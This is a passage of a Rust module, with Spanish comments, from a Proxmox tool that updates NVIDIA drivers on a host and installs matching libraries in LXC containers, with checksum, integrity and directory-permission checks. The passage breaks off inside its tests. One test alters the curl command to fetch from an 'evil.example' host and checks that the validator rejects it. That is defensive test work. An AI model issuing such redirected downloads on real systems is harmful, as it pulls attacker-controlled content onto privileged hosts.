    // CT con GPU NVIDIA: en marcha → se paran con el módulo; TODOS reciben las librerías (los apagados se arrancan y se vuelven a apagar)
    let gpu_cts: Vec<&crate::share::model::Guest> = inv.guests.iter().filter(|g| g.kind == GuestKind::Lxc && !g.template && g.gpu.nvidia).collect();
    let stop_cts: Vec<u32> = if host_needs { gpu_cts.iter().filter(|g| lxc_running(host, g.vmid)).map(|g| g.vmid).collect() } else { vec![] };
    let ct_version = |vmid: u32| inv.host.as_ref().and_then(|h| h.ct_nvidia.get(&vmid.to_string())).and_then(|n| n.version.clone());
    let libs: Vec<&crate::share::model::Guest> = match mode {
        Mode::CtLibs(id) => {
            let Some(g) = gpu_cts.iter().copied().find(|g| g.vmid == id) else { return skip(&format!("skipped: CT {id} is not an LXC with an NVIDIA GPU")) };
            vec![g]
        }
        // con el driver del host tocado, todos; si no, los que no coinciden (un CT apagado de versión desconocida no se arranca cada día)
        _ => gpu_cts.iter().copied().filter(|g| host_needs || ct_version(g.vmid).map_or_else(|| lxc_running(host, g.vmid), |v| v != target)).collect(),
    };
    if !host_needs && libs.is_empty() {
        return None;
    }
    let libs_cts: Vec<u32> = libs.iter().map(|g| g.vmid).collect();
    let Some(grant) = (if fresh { Grant::fresh } else { Grant::new })(&target, &kernel, flavor, stop_cts.clone(), libs_cts.clone()) else { return skip("skipped: could not build a safe command set (unexpected version or kernel name)") };
    let mut c = Cx {
        cx: Ctx { host, vmid: 0, log: vec![], dropped: 0, capture: vec![], abort: None, hold: false, no_prune: false, ev, security: 0, cancel: None, interrupted: false, root_used_kb: None },
        started_at,
        from: (!fresh).then(|| cur.clone()),
        to: Some(target.clone()),
        cts: vec![],
        reboot_needed: false,
        qs: cfg.check.timeout_s,
    };
    let what = match mode {
        Mode::CtLibs(id) => format!("driver libs in CT {id} only (host {cur} stays untouched)"),
        _ if fresh => format!("no NVIDIA driver in the host: installing {target} ({flavor}) from scratch"),
        Mode::Nvidia if newest.is_none() => format!("host {cur} ({flavor}) reinstalled (same version, forced)"),
        _ if host_needs => format!("host {cur} ({flavor}) → {target}"),
        _ => format!("host {cur} ({flavor}) → {target} (libs only: host already current)"),
    };
    c.cx.say(&format!("pxu NVIDIA driver update · {} · {what}", stamp(started_at)));
    // un CT con GPU que no recibe librerías lo dice explícitamente (panel y log), también si está apagado
    if !matches!(mode, Mode::CtLibs(_)) {
        for g in gpu_cts.iter().filter(|g| !libs_cts.contains(&g.vmid)) {
            c.cx.say(&skipped_libs_line(g.vmid, &g.name, ct_version(g.vmid).is_some()));
        }
    }
    let named = |ids: &[u32]| -> Vec<(u32, String)> { ids.iter().map(|&id| (id, inv.guests.iter().find(|g| g.vmid == id).map(|g| g.name.clone()).unwrap_or_default())).collect() };
    (c.cx.ev)(Event::Nv(Note::Plan(Plan { from: cur.clone(), to: target.clone(), host: host_needs, stop: named(&stop_cts), libs: named(&libs_cts), fresh })));
    // El permiso se deriva de las opciones del usuario y vale solo mientras dura este paso.
    let _optin = NvidiaOptIn::new(host, grant.clone());
    let (res, stop) = body(&mut c, cfg, &grant, mode, host_needs, &libs, cancel);
    let _ = c.cx.host_cmd(&grant.cleanup().iter().map(String::as_str).collect::<Vec<_>>(), &quick(cfg));
    let (outcome, detail) = res;
    let run = finish(&mut c, outcome, detail);
    Some((run, stop))
}

/// Línea de log de la corrida programada cuando existe una rama mayor más nueva (nunca salta sola).
pub fn branch_note(newest: &str) -> String {
    let m = major(newest).unwrap_or_default();
    format!("NVIDIA driver: a newer driver branch {m}.x exists ({newest}); pxu never changes branch by itself: run `pxu update --host --nvidia --yes` to upgrade")
}

/// Salto de rama que se ofrece en la ventana de `--nvidia`: versión actual, versión nueva (la más alta de su rama) y sabor del módulo.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BranchOffer {
    pub from: String,
    pub to: String,
    pub flavor: &'static str,
}

/// ¿Hay una rama mayor más nueva que el driver `.run` cargado y que SOPORTE la GPU del host? Solo lecturas (lspci, índice y `supportedchips`, sin opt-in).
/// `None` = no hay oferta (sin driver `.run`, sin red, sin GPU legible o ninguna rama nueva la lista): la corrida sigue como siempre.
pub fn branch_offer(host: &dyn Host, cfg: &Config) -> Option<BranchOffer> {
    let (cur, flavor) = host_driver(host)?;
    if !host.exists(Path::new(UNINSTALL)) {
        return None;
    }
    let o = quick(cfg);
    let mut out: Vec<String> = Vec::new();
    let ids = match host.host_cmd(hostcheck::LSPCI, &o, &mut out) {
        Ok(e) if e.code == 0 => host_nvidia_ids(&out.join("\n")),
        _ => return None,
    };
    // el módulo abierto no sirve para una GPU anterior a Turing
    if ids.is_empty() || (flavor == "open" && flavor_for_ids(&ids) != "open") {
        return None;
    }
    let mut idx: Vec<String> = Vec::new();
    let versions = match host.host_cmd(INDEX_CURL, &o, &mut idx) {
        Ok(e) if e.code == 0 => parse_index(&idx.join("\n")),
        _ => return None,
    };
    let po = ExecOpts { timeout_s: Some(CHIPS_PROBE_S), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() };
    let to = newest_major(&versions, &cur, |v| {
        let mut page: Vec<String> = Vec::new();
        matches!(host.host_cmd(&argv(&chips_curl(v)), &po, &mut page), Ok(e) if e.code == 0) && {
            let ok = parse_supported_ids(&page.join("\n"));
            !ok.is_empty() && ids.iter().all(|i| ok.contains(i))
        }
    })?;
    Some(BranchOffer { from: cur, to, flavor })
}

/// Instalación desde cero: la GPU NVIDIA del host (`lspci`) y la versión MÁS NUEVA del índice cuyo `supportedchips` la lista. Solo lecturas (sin opt-in).
/// Devuelve la versión y el sabor del módulo; `Err` = por qué no se puede, sin haber tocado nada.
fn pick_fresh(host: &dyn Host, cfg: &Config) -> Result<(String, &'static str), String> {
    let o = quick(cfg);
    let mut out: Vec<String> = Vec::new();
    let ids = match host.host_cmd(hostcheck::LSPCI, &o, &mut out) {
        Ok(e) if e.code == 0 => host_nvidia_ids(&out.join("\n")),
        Ok(e) => return Err(format!("cannot read the GPU list (lspci exit {}); nothing was installed", e.code)),
        Err(e) => return Err(format!("cannot read the GPU list (lspci: {e}); nothing was installed")),
    };
    if ids.is_empty() {
        return Err("no NVIDIA GPU found in lspci (no 10de video or 3D controller): there is no driver to install; nothing was changed".into());
    }
    let mut idx: Vec<String> = Vec::new();
    let versions = match host.host_cmd(INDEX_CURL, &o, &mut idx) {
        Ok(e) if e.code == 0 => parse_index(&idx.join("\n")),
        Ok(e) => return Err(format!("cannot read the NVIDIA index (curl exit {}); nothing was installed", e.code)),
        Err(e) => return Err(format!("cannot read the NVIDIA index: {e}; nothing was installed")),
    };
    let po = ExecOpts { timeout_s: Some(CHIPS_PROBE_S), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() };
    let mut last = String::new();
    for v in versions.iter().rev().take(CHIPS_PROBES) {
        let mut page: Vec<String> = Vec::new();
        match host.host_cmd(&argv(&chips_curl(v)), &po, &mut page) {
            Ok(e) if e.code == 0 => {
                let ok = parse_supported_ids(&page.join("\n"));
                if !ok.is_empty() && ids.iter().all(|i| ok.contains(i)) {
                    return Ok((v.clone(), flavor_for_ids(&ids)));
                }
            }
            Ok(e) => last = format!("curl exit {}", e.code),
            Err(e) => last = e.to_string(),
        }
    }
    let list = ids.iter().map(|i| format!("10de:{}", i.to_ascii_lowercase())).collect::<Vec<_>>().join(", ");
    Err(if last.is_empty() {
        format!("GPU {list} is not listed in the supportedchips of the newest {CHIPS_PROBES} NVIDIA releases; nothing was installed")
    } else {
        format!("cannot read NVIDIA's supportedchips ({last}); nothing was installed")
    })
}

/// `CT 129 (llama-swap): no libraries (already at the target version)`: por qué un CT con GPU no recibe las librerías del driver
/// (solo si el host no se tocó: con el driver del host instalado o reinstalado reciben todos).
fn skipped_libs_line(vmid: u32, name: &str, version_known: bool) -> String {
    let why = if version_known { "already at the target version" } else { "CT is stopped and its libs version is unknown" };
    let name = if name.is_empty() { String::new() } else { format!(" ({name})") };
    format!("CT {vmid}{name}: no libraries ({why})")
}

fn argv(v: &[String]) -> Vec<&str> {
    v.iter().map(String::as_str).collect()
}

type Res = ((Outcome, String), Option<String>);

/// Todo el trabajo bajo el permiso. `Err`-like: el segundo valor es el motivo de cortar la corrida (solo si ya se tocó el sistema).
fn body(c: &mut Cx, cfg: &Config, g: &Grant, mode: Mode, host_needs: bool, libs: &[&crate::share::model::Guest], cancel: &AtomicBool) -> Res {
    let fail = |c: &mut Cx, why: String| -> Res {
        c.cx.say(&format!("!! {why}"));
        ((Outcome::Failed, why), None)
    };
    // ---- preparación: solo toca WORK_DIR
    c.cx.step(super::Step::Preflight);
    let q = quick(cfg);
    // `install -d` seguiría un symlink y cambiaría el modo del destino: la ruta preexistente se valida ANTES (sin seguir symlinks) y otra vez después
    if let Err(why) = check_work_dir(c.cx.host, true) {
        return fail(c, why);
    }
    match c.cx.host_cmd(&argv(&g.mkdir()), &q) {
        Ok(0) => {}
        r => return fail(c, format!("cannot create {WORK_DIR}: {}", describe(&r))),
    }
    if let Err(why) = check_work_dir(c.cx.host, false) {
        return fail(c, why);
    }
    match c.cx.host_cmd(&argv(&g.df()), &q) {
        Ok(0) if free_kb(&c.cx).is_some_and(|k| k >= MIN_FREE_HOST_KB) => {}
        Ok(0) => return fail(c, format!("not enough free space in {WORK_DIR}: {} MB needed", MIN_FREE_HOST_KB / 1024)),
        r => return fail(c, format!("cannot check free space: {}", describe(&r))),
    }
    // ---- ¿la versión nueva soporta TODAS las GPUs del host? Antes de bajar el `.run`; si la lista no está disponible se avisa y se sigue
    // (una instalación desde cero ya eligió la versión por esa lista)
    if host_needs && !g.fresh {
        if let Err(why) = check_gpu_support(c, g, &q, matches!(mode, Mode::Branch(_))) {
            return fail(c, why);
        }
    }
    let file = run_file(&g.version);
    let want = match c.cx.host_cmd(&argv(&g.fetch_sha()), &q) {
        Ok(0) => parse_sha(&c.cx.capture.join("\n"), &file),
        r => return fail(c, format!("cannot download the checksum: {}", describe(&r))),
    };
    let Some(want) = want else { return fail(c, "the NVIDIA .sha256sum file is malformed".into()) };
    if g.fresh {
        if let Some(r) = fresh_setup(c, g) {
            return r;
        }
    }
    c.cx.step(super::Step::Refresh);
    if let Ok(0) = c.cx.host_cmd(&argv(&g.head()), &q) {
        if let Some(n) = parse_content_length(&c.cx.capture) {
            c.cx.say(&format!("download size: {n} bytes"));
            (c.cx.ev)(Event::Nv(Note::Size(n)));
        }
    }
    // Ctrl-C corta en el acto la descarga, la verificación y la compilación de prueba (nada del sistema se ha tocado aún):
    // el grupo de procesos entero recibe SIGTERM (`make -jN` tiene hijos) y `WORK_DIR` se borra al salir.
    let stop = |c: &mut Cx, what: &str, untouched: &str| -> Res {
        let why = format!("cancelled during {what}; {untouched}");
        c.cx.say(&format!("{}: stopped during {what}; {untouched}", super::cancel_requested(super::CANCEL_SIGNAL.load(AtomicOrdering::SeqCst), false, true)));
        ((Outcome::Cancelled, why), Some(super::cancel_reason()))
    };
    let cancelable = |s: u64| ExecOpts { cancel: Some(cancel), cancel_group: true, ..long_s(s) };
    let gone = |r: &Result<i32, String>| cancel.load(AtomicOrdering::SeqCst) && r.as_ref().map_or(true, |&c| c != 0);
    if cancel.load(AtomicOrdering::SeqCst) {
        return stop(c, "the preparation", "nothing was installed");
    }
    let dl = c.cx.host_cmd(&argv(&g.download()), &cancelable(FETCH_S));
    match dl {
        Ok(0) => {}
        ref r if gone(r) => return stop(c, "the download", "nothing was installed"),
        r => return fail(c, format!("download failed: {}", describe(&r))),
    }
    if cancel.load(AtomicOrdering::SeqCst) {
        return stop(c, "the download", "nothing was installed");
    }
    let sum = c.cx.host_cmd(&argv(&g.sha256sum()), &cancelable(VERIFY_S));
    let got = match sum {
        Ok(0) => c.cx.capture.iter().find_map(|l| l.split_whitespace().next().map(str::to_ascii_lowercase)),
        ref r if gone(r) => return stop(c, "the SHA-256 check", "nothing was installed"),
        r => return fail(c, format!("sha256sum failed: {}", describe(&r))),
    };
    if got.as_deref() != Some(want.as_str()) {
        return fail(c, format!("SHA-256 mismatch for {file}: the download does not match NVIDIA's checksum; nothing was installed"));
    }
    c.cx.say("sha256 OK");
    match c.cx.host_cmd(&argv(&g.check()), &cancelable(VERIFY_S)) {
        Ok(0) => c.cx.say("installer integrity (--check) OK"),
        ref r if gone(r) => return stop(c, "the installer check", "nothing was installed"),
        r => return fail(c, format!("the .run integrity check failed: {}", describe(&r))),
    }
    if host_needs {
        // el compilador de prueba falla ANTES de quitar el driver actual (el instalador desinstala el viejo y luego compila)
        if !c.cx.host.exists(Path::new(&format!("/lib/modules/{}/build", g.kernel))) {
            return fail(c, format!("kernel headers for the running kernel are missing (/lib/modules/{}/build): the module could not be built", g.kernel));
        }
        for (what, cmd) in [("extract", g.extract()), ("test build", g.make())] {
            match c.cx.host_cmd(&argv(&cmd), &cancelable(FETCH_S)) {
                Ok(0) => {}
                ref r if gone(r) => return stop(c, &format!("the driver {what}"), "the current driver was not touched"),
                r => return fail(c, format!("{what} of the driver failed ({}); the current driver was not touched", describe(&r))),
            }
        }
        if cancel.load(AtomicOrdering::SeqCst) {
            return stop(c, "the test build", "the current driver was not touched");
        }
        // ---- a partir de aquí se toca el sistema
        c.cx.step(super::Step::Upgrade);
        if let Some(r) = host_install(c, g) {
            if c.reboot_needed {
                // el módulo nuevo aún no está cargado: instalar librerías de 595.x contra el módulo viejo no sirve; se informa por CT
                for ct in libs {
                    c.cts.push(NvidiaCt { vmid: ct.vmid, name: ct.name.clone(), outcome: Outcome::Skipped, detail: "libs not installed: reboot the host first".into() });
                }
            }
            return r;
        }
    }
    super::CRITICAL.store(true, AtomicOrdering::SeqCst);
    // ---- librerías de los CT (el host ya está bien). El resultado del host NO depende del de los CT: cada uno se informa aparte
    for ct in libs {
        let r = ct_libs(c, g, ct.vmid, &ct.name, host_needs && g.stop_cts.contains(&ct.vmid), &want);
        c.cts.push(r);
    }
    let n_ok = c.cts.iter().filter(|r| r.outcome == Outcome::Ok).count();
    let n_bad = c.cts.iter().filter(|r| r.outcome == Outcome::Failed).count();
    let what = match mode {
        Mode::CtLibs(_) => format!("host untouched (driver {})", g.version),
        _ if host_needs => match c.from.as_deref() {
            Some(f) => format!("host driver {f} → {}", g.version),
            None => format!("host driver {} installed (there was none)", g.version),
        },
        _ => format!("host driver already {}", g.version),
    };
    let ok_ids: Vec<String> = c.cts.iter().filter(|r| r.outcome == Outcome::Ok).map(|r| r.vmid.to_string()).collect();
    let updated = if n_ok == 0 { "none".to_string() } else { ok_ids.join(", ") };
    let detail = format!("{what}; CT updated: {updated}{}", if n_bad > 0 { format!(" ({n_bad} failed: see each CT)") } else { String::new() });
    // en `CtLibs` el host no se tocó: no hay resultado del host que dar
    ((if matches!(mode, Mode::CtLibs(_)) { Outcome::Skipped } else { Outcome::Ok }, detail), None)
}

fn failed(c: &mut Cx, why: String) -> Res {
    c.cx.say(&format!("!! {why}"));
    ((Outcome::Failed, why), None)
}

/// Las dos escrituras de la instalación desde cero (apt y `update-initramfs`): no se matan a mitad.
fn uninterrupted(s: u64) -> ExecOpts<'static> {
    ExecOpts { timeout_s: Some(s), no_kill_on_timeout: true, env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
}

/// Instalación desde cero, antes de descargar nada grande: cabeceras del kernel (apt) y bloqueo de `nouveau`. `Some` = el paso termina aquí
/// (falló, o `nouveau` está cargado y hay que reiniciar el host antes de instalar).
fn fresh_setup(c: &mut Cx, g: &Grant) -> Option<Res> {
    let build = format!("/lib/modules/{}/build", g.kernel);
    if !c.cx.host.exists(Path::new(&build)) {
        let Some(cmd) = g.apt_headers() else {
            return Some(failed(c, format!("kernel headers for {} are missing and it is not a Proxmox (-pve) kernel: install them by hand and run this again", g.kernel)));
        };
        match c.cx.host_cmd(&argv(&cmd), &uninterrupted(SETUP_S)) {
            Ok(0) if c.cx.host.exists(Path::new(&build)) => {}
            r => return Some(failed(c, format!("cannot install the kernel headers (proxmox-headers-{}): {}; nothing else was changed", g.kernel, describe(&r)))),
        }
    }
    let blocked = matches!(c.cx.host.read_file(Path::new(NOUVEAU_CONF)), Ok(b) if b == NOUVEAU_BODY.as_bytes());
    if !blocked {
        c.cx.say(&format!("writing {NOUVEAU_CONF} (blacklist nouveau)"));
        if let Err(e) = c.cx.host.write_file(Path::new(NOUVEAU_CONF), NOUVEAU_BODY.as_bytes()) {
            return Some(failed(c, format!("cannot write {NOUVEAU_CONF}: {e}")));
        }
        match c.cx.host_cmd(&argv(&g.initramfs()), &uninterrupted(SETUP_S)) {
            Ok(0) => {}
            r => return Some(failed(c, format!("update-initramfs failed ({}) after blocking nouveau; nothing was installed", describe(&r)))),
        }
    }
    if c.cx.host.exists(Path::new(NOUVEAU_SYS)) {
        c.reboot_needed = true;
        let why = "nouveau is loaded (now blocked for the next boot): reboot the host and run `pxu update --host --nvidia` again (pxu never reboots it); nothing was installed";
        c.cx.say(&format!("!! {why}"));
        return Some(((Outcome::Warn, why.into()), None));
    }
    None
}

/// `Err` solo si una GPU NVIDIA de video del host NO está en la lista de `version`; sin lista legible o sin GPUs que comprobar, avisa y sigue.
/// Con `strict` (salto de rama mayor) NADA se da por bueno: sin GPU, sin lista legible o con un módulo `open` que no sirve para la GPU, falla sin tocar nada.
fn check_gpu_support(c: &mut Cx, g: &Grant, q: &ExecOpts, strict: bool) -> Result<(), String> {
    let version = g.version.as_str();
    // en modo estricto, el motivo de no poder confirmar; si no, un aviso y se sigue
    let unconfirmed = |c: &mut Cx, what: String| -> Result<(), String> {
        if strict {
            Err(format!("cannot confirm that the GPU is supported by {version}: {what}; nothing was downloaded or installed"))
        } else {
            c.cx.say(&format!("warning: {what}; the supported-GPU check was skipped"));
            Ok(())
        }
    };
    let ids = match c.cx.host_cmd(hostcheck::LSPCI, q) {
        Ok(0) => host_nvidia_ids(&c.cx.capture.join("\n")),
        r => return unconfirmed(c, format!("cannot read the GPU list (lspci: {})", describe(&r))),
    };
    if ids.is_empty() {
        return unconfirmed(c, "no NVIDIA video GPU found in lspci".into());
    }
    // el módulo abierto de NVIDIA no soporta GPUs anteriores a Turing
    if strict && g.flavor == "open" && flavor_for_ids(&ids) != "open" {
        return Err(format!("the open kernel module does not support every GPU of this host (a pre-Turing one is present); not changing to {version}; nothing was downloaded or installed"));
    }
    let url = chips_url(version);
    let path = chips_path(version);
    let html = match c.cx.host_cmd(&argv(&g.fetch_chips()), q) {
        Ok(0) => match c.cx.host.read_file(Path::new(&path)) {
            Ok(b) => String::from_utf8_lossy(&b).into_owned(),
            Err(e) => {
                unconfirmed(c, format!("cannot read the downloaded {url} ({e})"))?;
                String::new()
            }
        },
        r => return unconfirmed(c, format!("cannot download {url} ({})", describe(&r))),
    };
    let _ = c.cx.host.remove_file(Path::new(&path));
    let supported = parse_supported_ids(&html);
    if supported.is_empty() {
        return unconfirmed(c, format!("{url} has no GPU rows"));
    }
    let missing: Vec<&String> = ids.iter().filter(|i| !supported.contains(*i)).collect();
    if !missing.is_empty() {
        let list = missing.iter().map(|i| format!("10de:{}", i.to_ascii_lowercase())).collect::<Vec<_>>().join(", ");
        return Err(format!("GPU {list} is not listed in supportedchips for {version}; nothing was downloaded or installed"));
    }
    for i in &ids {
        c.cx.say(&format!("GPU 10de:{} listed in supportedchips for {version}", i.to_ascii_lowercase()));
    }
    Ok(())
}

/// `WORK_DIR` debe ser un directorio real (no symlink), de root y 0700. Ausente vale solo antes de crearlo (`may_be_missing`).
fn check_work_dir(host: &dyn Host, may_be_missing: bool) -> Result<(), String> {
    let m = match host.file_meta(Path::new(WORK_DIR)) {
        Ok(m) => m,
        Err(e) if may_be_missing && e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(format!("{WORK_DIR} is not usable ({e}); refusing to use it")),
    };
    if !m.is_dir {
        return Err(format!("{WORK_DIR} is not a directory; refusing to use it"));
    }
    if m.uid != 0 {
        return Err(format!("{WORK_DIR} is not owned by root (uid {}); refusing to use it", m.uid));
    }
    if m.mode != 0o700 {
        return Err(format!("{WORK_DIR} must be mode 0700 (it is {:04o}); refusing to use it", m.mode));
    }
    Ok(())
}

fn describe(r: &Result<i32, String>) -> String {
    match r {
        Ok(c) => format!("exit {c}"),
        Err(e) => e.clone(),
    }
}

/// Para los CT con GPU, descarga el módulo viejo e instala el nuevo con DKMS. `Some(resultado)` = falló (ya se recuperó lo posible).
fn host_install(c: &mut Cx, g: &Grant) -> Option<Res> {
    let q = long_s(c.qs);
    let mut stopped: Vec<u32> = vec![];
    for &id in &g.stop_cts {
        let _ = c.cx.host_cmd(&argv(&g.ct_shutdown(id)), &long_s(90));
        if lxc_running(c.cx.host, id) {
            let _ = c.cx.host_cmd(&argv(&g.ct_stop(id)), &long_s(90));
        }
        if lxc_running(c.cx.host, id) {
            c.cx.say(&format!("!! CT {id} did not stop"));
            return Some(recover(c, g, &stopped, format!("CT {id} did not stop: the module cannot be unloaded; nothing was changed")));
        }
        stopped.push(id);
    }
    let _ = c.cx.host_cmd(&argv(&g.persistenced(false)), &q);
    match c.cx.host_cmd(&argv(&g.unload()), &q) {
        Ok(0) => {}
        r => return Some(recover(c, g, &stopped, format!("the old NVIDIA module could not be unloaded ({}): something still uses it (DRM/KMS?); the old driver stays loaded", describe(&r)))),
    }
    match c.cx.host_cmd(&argv(&g.install()), &long()) {
        Ok(0) => {}
        r => return Some(recover(c, g, &stopped, format!("the NVIDIA installer failed ({})", describe(&r)))),
    }
    let ver = match c.cx.host_cmd(&argv(&g.smi()), &q) {
        Ok(0) => hostcheck::parse_smi_version(&c.cx.capture),
        _ => None,
    };
    if ver.as_deref() != Some(g.version.as_str()) {
        return Some(reboot_needed(c, g, &stopped, ver.as_deref()));
    }
    c.cx.say(&format!("nvidia-smi: driver {} OK", g.version));
    let _ = c.cx.host_cmd(&argv(&g.persistenced(true)), &q);
    // los CT que solo dependen del módulo vuelven ya; los de `libs` arrancan en su paso
    for &id in stopped.iter().filter(|id| !g.libs_cts.contains(id)) {
        let _ = c.cx.host_cmd(&argv(&g.ct_start(id)), &long_s(90));
    }
    None
}

fn long_s(s: u64) -> ExecOpts<'static> {
    ExecOpts { timeout_s: Some(s), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
}

/// El instalador terminó bien pero `nvidia-smi` no confirma la versión nueva: el módulo nuevo se carga al reiniciar. Único caso en que el driver pide reiniciar;
/// el host queda en aviso (no fallido), los CT parados vuelven a arrancar y ninguno recibe librerías hasta entonces.
fn reboot_needed(c: &mut Cx, g: &Grant, stopped: &[u32], seen: Option<&str>) -> Res {
    let q = long_s(c.qs);
    let _ = c.cx.host_cmd(&argv(&g.persistenced(true)), &q);
    for &id in stopped {
        let _ = c.cx.host_cmd(&argv(&g.ct_start(id)), &long_s(90));
    }
    c.reboot_needed = true;
    let detail = format!("the installer finished but nvidia-smi reports {} instead of {}: REBOOT the host to load the new module (pxu never reboots it); no CT received libs", seen.unwrap_or("nothing"), g.version);
    c.cx.say(&format!("!! {detail}"));
    ((Outcome::Warn, detail), None)
}

/// Falló el driver del host: ningún CT recibe librerías; los CT parados vuelven a arrancar si el módulo viejo aún carga.
fn recover(c: &mut Cx, g: &Grant, stopped: &[u32], why: String) -> Res {
    c.cx.say(&format!("!! {why}"));
    let q = long_s(c.qs);
    let _ = c.cx.host_cmd(&argv(&g.persistenced(true)), &q);
    let loadable = matches!(c.cx.host_cmd(&argv(&g.load()), &q), Ok(0)) && matches!(c.cx.host_cmd(&argv(&g.smi()), &q), Ok(0));
    let mut note = String::new();
    if loadable && !stopped.is_empty() {
        for &id in stopped {
            let _ = c.cx.host_cmd(&argv(&g.ct_start(id)), &long_s(90));
        }
        note = format!("; the previous driver still loads: CT {} started again", stopped.iter().map(u32::to_string).collect::<Vec<_>>().join(", "));
    } else if !stopped.is_empty() {
        note = format!("; the NVIDIA module does NOT load: CT {} left stopped (fix the driver, then start them)", stopped.iter().map(u32::to_string).collect::<Vec<_>>().join(", "));
    }
    let detail = format!("{why}{note}; no CT received libs");
    c.cx.say(&format!("!! {detail}"));
    ((Outcome::Failed, detail), Some("NVIDIA driver update failed".into()))
}

/// Librerías de un CT: copia el `.run` a un directorio privado nuevo, revisa su SHA-256 allí, `--no-kernel-modules`, verifica con `nvidia-smi` y reinicia el CT.
/// Un CT que estaba apagado se arranca para esto y se vuelve a apagar al terminar (también si falla): queda como estaba.
fn ct_libs(c: &mut Cx, g: &Grant, vmid: u32, name: &str, we_stopped_it: bool, want: &str) -> NvidiaCt {
    let done = |c: &mut Cx, outcome: Outcome, detail: &str| {
        c.cx.say(&format!("CT {vmid}: {detail}"));
        (c.cx.ev)(Event::Nv(Note::Ct { vmid, outcome, detail: detail.into() }));
        NvidiaCt { vmid, name: name.into(), outcome, detail: detail.into() }
    };
    c.cx.vmid = vmid;
    // apagado desde antes (no por pxu al parar el módulo): se arranca solo para esto y se apaga de nuevo
    let was_off = !we_stopped_it && !lxc_running(c.cx.host, vmid);
    if we_stopped_it || was_off {
        match c.cx.host_cmd(&argv(&g.ct_start(vmid)), &long_s(90)) {
            Ok(0) => {}
            r => return done(c, Outcome::Failed, &format!("cannot start the CT{}: {}", if was_off { " (it was stopped; left stopped)" } else { "" }, describe(&r))),
        }
    }
    let worked = ct_libs_work(c, g, vmid, want);
    if was_off {
        let _ = c.cx.host_cmd(&argv(&g.ct_shutdown(vmid)), &long_s(90));
        if lxc_running(c.cx.host, vmid) {
            let _ = c.cx.host_cmd(&argv(&g.ct_stop(vmid)), &long_s(90));
        }
        let off = !lxc_running(c.cx.host, vmid);
        return match worked {
            Err(why) => done(c, Outcome::Failed, &format!("{why}{}", if off { "; CT left stopped as it was" } else { "; !! the CT could not be stopped again" })),
            Ok(()) if off => done(c, Outcome::Ok, &format!("libs {} installed (CT was stopped: started and stopped again)", g.version)),
            Ok(()) => done(c, Outcome::Warn, &format!("libs {} installed but the CT could not be stopped again (it was stopped before)", g.version)),
        };
    }
    match worked {
        Err(why) => done(c, Outcome::Failed, &why),
        Ok(()) => match c.cx.host_cmd(&argv(&g.ct_reboot(vmid)), &long_s(120)) {
            Ok(0) => done(c, Outcome::Ok, &format!("libs {} installed, CT restarted", g.version)),
            r => done(c, Outcome::Warn, &format!("libs {} installed but the CT restart failed ({})", g.version, describe(&r))),
        },
    }
}

/// Lo que se hace dentro del CT (ya en marcha): espacio, copia del `.run`, SHA-256, instalador de librerías y `nvidia-smi`. `Err` = motivo del fallo.
fn ct_libs_work(c: &mut Cx, g: &Grant, vmid: u32, want: &str) -> Result<(), String> {
    let q = long_s(c.qs);
    match c.cx.guest(CT_DF, &q) {
        Ok(0) if free_kb(&c.cx).is_some_and(|k| k >= MIN_FREE_CT_KB) => {}
        Ok(0) => return Err(format!("not enough free space in the CT (/var/lib): {} MB needed", MIN_FREE_CT_KB / 1024)),
        r => return Err(format!("cannot check CT free space: {}", describe(&r))),
    }
    let dir = match c.cx.guest(CT_MKTEMP, &q) {
        Ok(0) => c.cx.capture.iter().map(|l| l.trim()).find(|l| !l.is_empty()).map(String::from),
        r => return Err(format!("cannot create a private directory in the CT: {}", describe(&r))),
    };
    let Some(dir) = dir.filter(|d| ct_dir_ok(d)) else {
        return Err("the CT returned an unexpected temporary directory; nothing was copied".into());
    };
    let mut result = match c.cx.host_cmd(&argv(&g.ct_push(vmid, &dir)), &long_s(FETCH_S)) {
        Ok(0) => {
            // el directorio es de root y 0700; aun así se revisa lo copiado justo antes de ejecutarlo
            let sha = match c.cx.guest(&argv(&ct_sha(&dir)), &q) {
                Ok(0) => c.cx.capture.iter().find_map(|l| l.split_whitespace().next().map(str::to_ascii_lowercase)),
                _ => None,
            };
            if sha.as_deref() != Some(want) {
                Some("the installer copied into the CT does not match the verified SHA-256; not executed".to_string())
            } else {
                match c.cx.guest(&argv(&ct_libs_argv(&dir)), &long()) {
                    Ok(0) => None,
                    r => Some(format!("the libs installer failed: {}", describe(&r))),
                }
            }
        }
        r => Some(format!("cannot copy the installer into the CT: {}", describe(&r))),
    };
    let _ = c.cx.guest(&argv(&ct_rm(&dir)), &q);
    if result.is_none() {
        let v = match c.cx.guest(hostcheck::NVIDIA_SMI, &q) {
            Ok(0) => hostcheck::parse_smi_version(&c.cx.capture),
            _ => None,
        };
        if v.as_deref() != Some(g.version.as_str()) {
            result = Some(format!("verification failed: nvidia-smi in the CT reports {}", v.as_deref().unwrap_or("nothing")));
        }
    }
    result.map_or(Ok(()), Err)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fresh_install_helpers_pick_the_flavor_and_accept_only_exact_forms() {
        let ids = |l: &[&str]| l.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        assert_eq!(flavor_for_ids(&ids(&["24B0"])), "open");
        assert_eq!(flavor_for_ids(&ids(&["24B0", "1B80"])), "proprietary", "one pre-Turing GPU makes it proprietary");
        assert_eq!(flavor_for_ids(&[]), "proprietary");
        let c = chips_curl("595.120.01");
        assert!(is_chips_curl(&c.iter().map(String::as_str).collect::<Vec<_>>()));
        let mut bad = c.clone();
        bad[6] = "https://evil.example/README/supportedchips.html".into();
        assert!(!is_chips_curl(&bad.iter().map(String::as_str).collect::<Vec<_>>()));
        let mut with_o = c.clone();
        with_o.insert(6, "-o".into());
        assert!(!is_chips_curl(&with_o.iter().map(String::as_str).collect::<Vec<_>>()));
        assert!(Grant::new("595.120.01", "6.17.13-2-pve", "open", vec![], vec![]).unwrap().apt_headers().unwrap().last().unwrap() == "proxmox-headers-6.17.13-2-pve");
        assert!(Grant::new("595.120.01", "6.12.0-generic", "open", vec![], vec![]).unwrap().apt_headers().is_none(), "only -pve kernels");
        let plain = Grant::new("595.120.01", "6.17.13-2-pve", "open", vec![], vec![]).unwrap();
